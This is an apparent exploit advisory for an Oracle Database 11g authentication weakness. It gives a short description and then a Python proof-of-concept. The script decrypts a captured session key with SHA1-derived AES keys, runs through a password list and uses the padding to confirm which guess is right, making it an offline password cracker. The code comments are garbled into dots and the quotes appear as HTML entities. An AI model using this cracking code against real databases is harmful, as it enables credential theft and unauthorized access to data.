 
An attacker can exploit this issue to bypass the authentication process and gain unauthorized access to the database.
 
This vulnerability affects Oracle Database 11g Release 1 and 11g Release 2.
 
 
    #-*-coding:utf8 -*-
      
    import hashlib
    from Crypto.Cipher import AES
      
    def decrypt(session,salt,password):
            pass_hash = hashlib.sha1(password+salt)
      
            #......... ..... ..... .......... .. 24 ....
            key = pass_hash.digest() + &#039;\x00\x00\x00\x00&#039;
            decryptor = AES.new(key,AES.MODE_CBC)
            plain = decryptor.decrypt(session)
            return plain
      
    #............. ........... ...... 48 ....
    session_hex = &#039;EA2043CB8B46E3864311C68BDC161F8CA170363C1E6F57F3EBC6435F541A8239B6DBA16EAAB5422553A7598143E78767&#039;
      
    #.... 10 ....
    salt_hex = &#039;A7193E546377EC56639E&#039;
      
    passwords = [&#039;test&#039;,&#039;password&#039;,&#039;oracle&#039;,&#039;demo&#039;]
      
    for password in passwords:
            session_id = decrypt(session_hex.decode(&#039;hex&#039;),salt_hex.decode(&#039;hex&#039;),password)
            print &#039;Decrypted session_id for password "%s" is %s&#039; % (password,session_id.encode(&#039;hex&#039;))
            if session_id[40:] == &#039;\x08\x08\x08\x08\x08\x08\x08\x08&#039;:
                    print &#039;PASSWORD IS "%s"&#039; % password
                    break

